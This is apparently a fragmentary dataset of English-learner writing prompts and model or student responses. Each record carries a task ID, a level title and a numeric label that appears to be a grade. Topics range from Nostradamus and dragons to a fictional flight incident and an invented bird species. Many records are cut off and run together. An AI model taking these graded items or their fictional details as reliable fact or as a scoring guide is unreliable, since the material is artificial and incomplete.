In what ways will they positively and negatively affect society? Type in the input box. Write 150-200 words. [SEP] Response: Some look to the stars to spot signs of life on other planets. Others look for signs of a different kind, to the omens and portents they hope will foretell of riches a-waiting, relationships a-coming and fame a-calling. Some look upward to the heavens for such signs; others, inward to visions and inspiration. And the rest of us may look downward at more humble and homely teacups, tarot cards and talismans to find what the future might hold in store.\n\nBy no means a 21st-century phenomenon, means of divining the future have long been part of traditional cultures around the world. People have scoured their dreams for symbols that might unlock what’s around the corner. Some societies have looked to Mother Nature for guidance, reading the entrails of animals or the shapes formed by clouds, shadows cast by stones or yarrow stalks, or scanned upturned palms and faces. These forms of divination have often been associated with people believed, or who believe themselves, to have special gifts of extrasensory perception, or second sight. The role of the priest or priestess, shaman or magician is still central in many societies today, though their responsibilities may now also include here-and-now concerns as well as forebodings.\n\nThroughout history, particular people have been associated with clairvoyant or clairaudient abilities. For the rationalists, these people are no more than charlatans who offer vague and cryptic messages, veiled in metaphor and imagery, open to variable interpretations. To those who feel there is more to this world than the physical eyes can show us, such messengers hold the key to unlocking the future trajectory of our world, and offer hope of averting dangers yet to come.\n\nOne such individual is Nostradamus. Controversy and criticism surround what is known of him. Born Michel de Nostredame in France in the early 16th century, he Latinized his name to Nostradamus for personal reasons. Often depicted as a physician, some historians claim he was thrown out of medical university. On one thing most would agree, however: Nostradamus was an astrologer, looking to the movement of the planets and people’s times of birth to draw up his prognostications. But he has perhaps gained most notoriety not for his glimpses into personal lives, but for his revelations about the future through quatrains, or verse-like commentary.\n\nAttributed to Nostradamus with the benefit of what naysayers call retrospective hindsight are prophesies of world wars, numerous famines and disasters, man’s landing on the moon and the recent collapse of world economies. For non-believers, however, these verses are no more than the ramblings of a man deluded, and the application of creative interpretation on the part of those who wish to believe in Nostradamus’ clairvoyance. Linguists argue his messages were wrapped in such obscurity and metaphorical language that the doors of perception were left wide open for the public to make of them what they would. They point to the wealth of phrases such as ‘and the young lion shall overcome the old’ as his means to figuratively (and some would say, therefore, evasively) refer to a wide spread of people and nations. But when the times get tough and bad things happen to good people, many look to Nostradamus’ writings, imagining they foretold this writing on the wall and heralded apocalyptic news.\n\nHow did Nostradamus make these predictions supposedly ranging from technological advances to world destruction? Reportedly, he stared into water or fire to see these visions, though more extreme believers claim the man was a time traveler! Perhaps there is only one thing we can be truly certain of, however: The debate about the meaning of Nostradamus’ work will continue for as long we have a future!", "task_id": "01e27f6c-3c08-4d7c-8c58-fbe93505be01", "level_title": "16-Upper Advanced", "label": 0}

Write 150-200 words. [SEP] Response: Legendary creatures have fascinated humans for centuries, appearing in myths, folklore, and literature across cultures. One such creature is the dragon, a symbol of power and mystery. Dragons are often depicted as large, serpentine beings with the ability to breathe fire. In Western mythology, they are usually portrayed as fearsome beasts guarding treasures, challenging heroes with their strength and cunning. Conversely, in Eastern traditions, dragons are revered as benevolent and wise, associated with water and weather, bringing prosperity and good fortune. Another legendary creature is the phoenix, a bird that cyclically regenerates or is otherwise born again. According to legend, the phoenix bursts into flames at the end of its life and is reborn from its ashes, symbolizing renewal and immortality. Unicorns, with their single spiraled horn, represent purity and grace, often believed to possess healing powers. These creatures, whether feared or admired, embody the human imagination's boundless creativity and our desire to explain the unknown. They serve as metaphors for human qualities and natural phenomena, enriching our cultural heritage with their timeless stories. The allure of legendary creatures lies in their ability to transcend reality, offering a glimpse into a world where the extraordinary becomes possible.", "task_id": "f03e111e-8a30-48fe-991b-6adfea2444ad", "level_title": "16-Upper Advanced", "label": 5}

Write about issues and challenges that language students often face. Ask yourself guiding questions to help organize the writing. Type in the input box. Write 150-250 words. [SEP] Response: Language students often encounter various issues and challenges that can hinder their learning experience. What are the most common obstacles? One significant challenge is the complexity of grammar rules. Understanding tenses, articles, and sentence structure can be daunting, leading to frustration.\n\nAnother common issue is vocabulary acquisition. How can students effectively retain new words? Memorization is often insufficient; students may struggle with using vocabulary in context, which can stifle their speaking and writing abilities.\n\nPronunciation also poses a challenge. Why is it difficult for students to produce sounds that do not exist in their native language? This can affect their confidence and ability to communicate effectively. Additionally, the fear of making mistakes often prevents students from practicing speaking, further impeding their progress.\n\nCultural nuances present another layer of complexity. How do language students navigate idiomatic expressions and cultural references? These elements are vital for fluency and understanding the context in which language is used.\n\nLastly, what role does motivation play in language learning? Students may face a lack of motivation due to slow progress or overwhelming material. It’s essential for educators to foster an encouraging environment and provide tools to address these challenges, making the learning process more enjoyable and effective.", "task_id": "43d154ea-bd72-4b54-9339-7c12f992b56a", "level_title": "15-Advanced", "label": 5}

[SEP] Response: Flight Report\n\nOn June 13, 2010, at 1818 Pacific Daylight Time, InterStar Airways Flight 293, landed at San Francisco International Airport (SFO), San Francisco, California, with the nose wheels cocked at 90 degrees. InterStar Airways was operating the airplane as a scheduled domestic passenger flight. The captain, first officer, four flight attendants, and 141 passengers were not injured. The flight departed Oakland, California, at 1531 as a non-stop to Sky Harbor International Airport, Phoenix, Arizona.\n\nThe captain noted no problems during the initial departure, and observed a positive rate of climb. The flight crew noted an error message displayed on the control board. There was a fault message for a nose landing gear shock absorber.  The data indicated that the gear handle was positioned to the down position, and there was an error message of a fault for the nose wheel steering.  \n\nThe flight diverted to San Jose, California. The captain was asked to perform a flyby of the tower for verification on the gear status. The tower, InterStar ground personnel, and a local news helicopter advised him that the nose gear was cocked 90 degrees to the left. When he found out this information, the captain decided to divert to SFO because it had optimum field conditions, a longer runway, and a better emergency support services. The crew flew for several hours to burn fuel so that they could land at a lighter weight.\n\nThe captain advised the cabin crew that in the event that the nose gear collapsed, evacuation from the front doors was not available so everyone would deplane from the rear exits. The flight crew continually updated the cabin crew and passengers about the situation, and advised the cabin crew to prepare for emergency procedures.  \n\nThe captain flew the airplane for the landing. He touched down at 120 knots, and applied normal braking at 90 knots. He held the nose gear off of the ground as long as possible. At 60 knots, the flight crew shut down the engines. They did not use reverse thrust or auto-braking. During the landing, the forward cabin crew could smell burnt rubber. The air traffic control tower confirmed that there was no fire, and the captain announced this to the cabin crew. After this notification, the passengers deplaned normally using an air stair.\n\nUpon touchdown, the tires rapidly deflated and tore apart, and both wheels were worn into the axle. During landing, the airplane's trajectory was not affected by the abnormal configuration or subsequent tire destruction, and the airplane stayed on the runway centerline.", "task_id": "1d81e8fb-cc7e-41b2-bd0e-6cb0bc1f50ee", "level_title": "Aviation", "label": 0}

However, each model has its own strengths that set them apart.\nElectric 3.0\n* Interior & Comfort: Slightly more spacious and comes with high-end, expensive leather.\n* Performance: Accelerates from 0-100 km/h slightly faster than its competitor.\n* Luxury: Offers a better in-car fragrance and superior comfort.\n* Price: More expensive compared to the X 411.\nX 411\n* Engine & Power: Features a more powerful engine, making it the most powerful car in its category.\n* Performance: Considered top-of-the-line in terms of raw power and driving dynamics.\n* Luxury: While both cars are luxurious, it is hard to determine which one is superior in this aspect.\nCommon Features\n* Safety: Both models come equipped with airbags and advanced safety features.\n* Space: Both vehicles are roomy and comfortable for passengers.\n* Traction: Designed for stability and smooth driving.\nIn conclusion, choosing between the Electric 3.0 and the X 411 depends on personal preference.

Use some of the language you have learned for criticizing in this lesson. Type in the input box. Write 150-200 words. [SEP] Response: In recent times, celebrity culture has grown into a phenomenon that often overshadows more meaningful contributions to society. Many celebrities gain fame not for talent or hard work, but simply for being present on social media. Their influence can sometimes lead to the spread of unrealistic beauty standards, unhealthy lifestyles, and misinformation.\nFor instance, some influencers endorse products they don’t use, purely for monetary gain, misleading millions of followers. This commercialisation of personal lives erodes authenticity. Instead of inspiring genuine self-improvement, many celebrities create a culture of comparison, causing mental health issues, especially among younger audiences.\nFurthermore, the media tends to prioritize celebrity gossip over critical global issues. This obsession with fame can distract the public from problems that truly need attention, such as climate change, poverty, or education reform.\nIn conclusion, while not all celebrities are harmful, the glorification of fame for its own sake is problematic. We should be more critical of who we admire and why.", "task_id": "121c9e2c-8842-494b-93b1-9af8c82f91f4", "level_title": "16-Upper Advanced", "label": 5}

In many countries, these types of activities also give companies tax reductions that can be attractive. \n\nSome people criticize that companies only do this to save taxes and for image, so they would prefer that they pay more taxes so that the state could offer better services. It is a good point that all parts of society have social awareness.\n\nIn the online debate we can see how there are different contrasting opinions, I follow the line of James.W@efstudent.com.\n\nTo sum up, tt is good that companies have an active role in society for their integration. We must never forget that the last term each state must be responsible for guaranteeing the best behavior and the welfare state for their people.", "task_id": "8f1a0c16-d259-4737-af06-b6b6eb9e9799", "level_title": "13-Advanced", "label": 4}

It has been falsely reported in the press that share prices of our company have dropped.\nThis absurd claim is entirely fabricated, and we believe it originated in the press just as construction for Mishima Corporation's new HQ building is starting. It is important to mention that recently White Space beat 20 other top agencies to get the contract from Mishima, having our design approved by Mr. Mishima himself. Additionally, our company profits are coming from consecutives rises in the past three years and we have already got three big contracts lined up in the coming years also.\nThese extremely irresponsible reports will be the focus of an investigation by White Space's legal team.

Whether it's starting a new job, moving to a different city, or adjusting to unexpected circumstances, change challenges us to grow and adapt. Although it can be uncomfortable at first, change often brings new opportunities and fresh perspectives.\n\nMany people resist change because it brings uncertainty. It takes us out of our comfort zones and forces us to confront the unknown. However, resisting change can hold us back from reaching our full potential. By embracing it, we open the door to personal development and transformation.\n\nTo make the most of change, it’s important to stay positive, set clear goals, and remain flexible. Accepting that not everything is within our control allows us to focus on what we can influence. Even setbacks can become stepping stones toward success when we adopt a mindset of growth.\n\nSurrounding ourselves with supportive people and taking time to reflect can also help during transitions. In the end, change isn’t something to fear—it’s something to welcome. It reminds us that we’re alive, evolving, and capable of creating better versions of ourselves with every step forward.", "task_id": "57251d37-a835-4f6c-aec1-49910b3e4d9c", "level_title": "Travel English", "label": 0}

A possible solution is to ensure fair shift rotations and provide proper rest periods. Another issue is pollution caused by improper waste disposal or oil leaks. This can seriously harm the marine environment. To prevent this, strict pollution control measures should be followed, and proper waste management systems should be in place.

Rewarding achievements, whether big or small, can be a great motivator.\n\nInvest in career growth: Take the time to support your team's professional development. Offer training and be a mentor—this shows you're invested in their future.\n\nPromote work-life balance: Recognize that employees have lives outside of work. Encouraging a healthy balance can reduce burnout and increase job satisfaction.\n\nListen actively: Make sure your team feels heard, even when it’s feedback or complaints. Listening builds trust and fosters a more engaged workplace.\n\nLead by example: Treat your employees the way you’d want to be treated by your superiors. Respect, honesty, and fairness go a long way.\n\nAvoid these pitfalls:\nDisrespecting your team or belittling their contributions.\n\nTaking credit for their work.\n\nLosing your temper in stressful situations.\n\nAllowing employees to take the fall for mistakes.\n\nFailing to give praise where it’s due.\n\nBest of luck leading your team!\n\nBest,\nXxxxxx", "task_id": "b4ba34ff-949d-4a82-9f56-ea472f177a71", "level_title": "13-Advanced", "label": 5}

[SEP] Response: Buying a home is one of the most exciting things you’ll do in your life. It’s also likely the most expensive.

The good news is that you can set yourself up for success by following some steps.\nWhile eligibility criteria can vary by lender and loan type, there are a few common requirements that mortgage lenders typically look for. First of all, good Credit.\nThe credit score you’ll need will depend on the type of mortgage you want. You should usually have a score of at least 620 for a conventional loan. But you might qualify with a lower credit score for other kinds of mortgages, such as those backed by the Federal Housing Administration (FHA), U.S. Department of Agriculture (USDA) or Department of Veterans Affairs (VA).\n\nAlso, keep in mind that the higher your credit score, the better your interest rate will be.\nLenders want to see that you can afford to repay your loan, so you’ll need to provide proof of both consistent income and employment, such as with tax returns, pay stubs or 1099 forms.\n\nThey’ll also consider any assets you have that you could draw on in case of financial emergencies, such as money market accounts, stock portfolios or other properties you own.", "task_id": "e56737ef-22af-472e-88bd-a73361bcb7d9", "level_title": "16-Upper Advanced", "label": 5}

For the classification, suggest a name for the new species and say why it’s suitable. Use the email as reference. [SEP] Response: Introducing Turdus canadensis: A Newly Discovered Bird Species\n\nRecent DNA analysis has revealed an exciting discovery: a new bird species closely related to the American robin (Turdus migratorius). This newly identified species, Turdus canadensis, shares many characteristics with its well-known relative but also exhibits distinct differences in appearance and habitat.  \n\nAppearance\nWhile resembling the American robin, Turdus canadensis is slightly smaller in body size yet possesses a noticeably larger bill. The males of this species display a rustier hue in their plumage, in contrast to the more vibrant red of the American robin’s breast.  \n\nHabitat and Range \nBoth species inhabit similar environments, including forests, gardens, and open fields. However, unlike the American robin, which migrates to the southern United States and beyond during winter, Turdus canadensis remains north of the Canadian border year-round. This adaptation suggests a greater cold tolerance and a different seasonal foraging strategy.  \n\nTaxonomic Classification\n- Kingdom: Animalia  \n- Phylum: Chordata  \n- Class: Aves  \n- Order: Passeriformes  \n- Family: Turdidae  \n- Genus: Turdus \n- Species: Turdus canadensis\n\nThe name Turdus canadensis is fitting, as it highlights the bird’s strong association with Canada, particularly its year-round residency in northern latitudes. This discovery enhances our understanding of avian diversity and adaptation within the Turdus genus.", "task_id": "fd6132f4-a3e2-4a63-b2d3-2336f120b95a", "level_title": "Sciences", "label": 5}

Thirty years ago you had to carry a printed newspaper if you wanted to read news for example when commuting: now you just take your phone and swipe the pages of the news.

Use the bullet points to help you. [SEP] Response: The most common methods\nIllegal immigration is a crime that affects all aspects of our society. As a border control agent, it is important for you to understand the most common methods of illegal immigration so that you can better serve our fellow citizens.\n\nFirst, it is important to know what is meant by the term “illegal immigration”. Simply put, it describes people who enter or remain in a country without formal permission, so they are there illegally rather than lawfully.\n\nThe most subtle and least serious form of illegal immigration is overstaying one's visa, which is considered a civil offence. An immigrant might enter the country legally, but when they stay longer than permitted or violate the provisions of their visa, they have committed an infraction and may have to pay a fine or they may be deported, or both.\n\nOn the other hand, crossing the border of a country illegally is considered a federal crime. Immigrants from other countries who do not qualify for an entry visa may try to sneak across the border to gain entry. Although this tends to happen quite often because of economic reasons, with people migrating from poorer countries to richer countries, it can happen in almost any country for any reason.\n\nTwo even more serious methods of illegal immigration are people smuggling and people trafficking. Many people think these two phrases refer to the same offence; however they are two very different crimes.\n\nPeople smuggling takes place with the consent of the person being smuggled illegally into a country, whereas people trafficking is the illegal trade in human beings, usually for the purpose of forced labor or sexual exploitation. Either way, a person can be hidden from the authorities in the cargo of a boat or truck, for example, or they can pass through checkpoints using fraudulent passports or other counterfeit documents.

Remember the structure you've learned on how to construct an argument. Write 200-250 words. [SEP] Response: I strongly believe that companies have a responsibility to society beyond just making profits for shareholders. Businesses do not operate in a vacuum—they rely on communities for labor, infrastructure, and customers. Therefore, it’s only fair that they give back in meaningful ways.\n\nCorporate social responsibility (CSR) is not just about charity; it’s about sustainable and ethical business practices. When companies invest in their communities, support education, reduce environmental harm, and treat employees fairly, they create a positive cycle. For example, offering fair wages and safe working conditions leads to happier employees, which in turn boosts productivity and reduces turnover. Similarly, supporting local education helps build a skilled future workforce, which benefits the company in the long run.\n\nCritics argue that CSR is just a marketing tool or that it distracts from profit-making. But I see it as a win-win. Consumers today are more socially conscious and prefer to support brands that align with their values. So, CSR can actually enhance a company’s reputation and profitability.\n\nIn conclusion, CSR should be an integral part of every company’s operations. It’s not just good ethics—it’s good business.

Unlike Tokyo's modernity, Kolkata's charm lies in its historical significance and the slower pace of life, allowing for a deeper connection with its traditions.\n\nBoth cities are captivating in their own ways, offering distinct experiences that reflect their unique identities.", "task_id": "bdd2883c-b71b-4fb7-a44c-a53e7bbf26f4", "level_title": "15-Advanced", "label": 4}
{"text": "Prompt Level: 15-Advanced [SEP] Prompt: You're going to write about an interesting, fictional event that happened to a friend. Write your blog post. Type in the input box. Write 150-200 words. [SEP] Response: \"A Strange Encounter in the Mountains\"\n\nLast summer, my friend Lucas went on a solo hiking trip in the Andes Mountains. He had planned everything carefully  the route, the equipment, and even the food. However, on the third day of his journey, something truly unexpected happened.\n\nWhile walking through a remote path, Lucas stumbled upon an old cabin that wasn’t marked on any of his maps. Curious and a bit cautious, he approached it. To his surprise, the door was unlocked and there was fresh food on the table inside. It was clear someone had been there recently, but no one was around.\n\nSuddenly, a friendly dog came running toward him, wagging its tail. The dog led Lucas further into the woods, where he found an elderly man who had lived there in isolation for over a decade. They spoke for hours. The man shared stories of his decision to leave the city behind and live in peace with nature.\n\nLucas returned home a few days later, deeply inspired. He now volunteers for environmental causes and says that meeting that man changed his perspective on life. It sounds like something out of a movie but he swears it’s all true.", "task_id": "56de3bdd-b83e-4dd4-9213-446b7e00e3cd", "level_title": "15-Advanced", "label": 5}
{"text": "Prompt Level: 16-Upper Advanced [SEP] Prompt: In the preceding units, nine writing techniques were introduced: metaphor, hyperbole, symbolism, free writing, focused free writing, loop writing, listing, questioning and cubing. Write a paragraph or two explaining which techniques seem most useful to you. Type in the input box. Write 150-200 words. [SEP] Response: Among the nine writing techniques introduced, metaphor and symbolism stand out as particularly useful. Metaphors allow writers to convey complex ideas and emotions through vivid comparisons, making abstract concepts more relatable and engaging. For instance, describing a challenging journey as \"climbing a mountain\" can evoke a sense of struggle and achievement. Symbolism, on the other hand, enriches writing by embedding or finding deeper meanings within objects, characters, or events. This technique can add layers of interpretation and invite readers to explore the underlying themes of a narrative. It sort of helps us connect two things usually one leading the other or one working as a symbol for the other.\n\nFocused free writing is another valuable technique, especially for overcoming writer's block. By concentrating on a specific topic without worrying about grammar or structure, writers can generate raw material that can later be refined. This method encourages creativity and helps in discovering new ideas.\n\nOverall, these techniques enhance the depth and clarity of writing, making it more impactful and thought-provoking.", "task_id": "81ee255e-d4fa-4f81-b77f-dfcf3b5cf541", "level_title": "16-Upper Advanced", "label": 4}
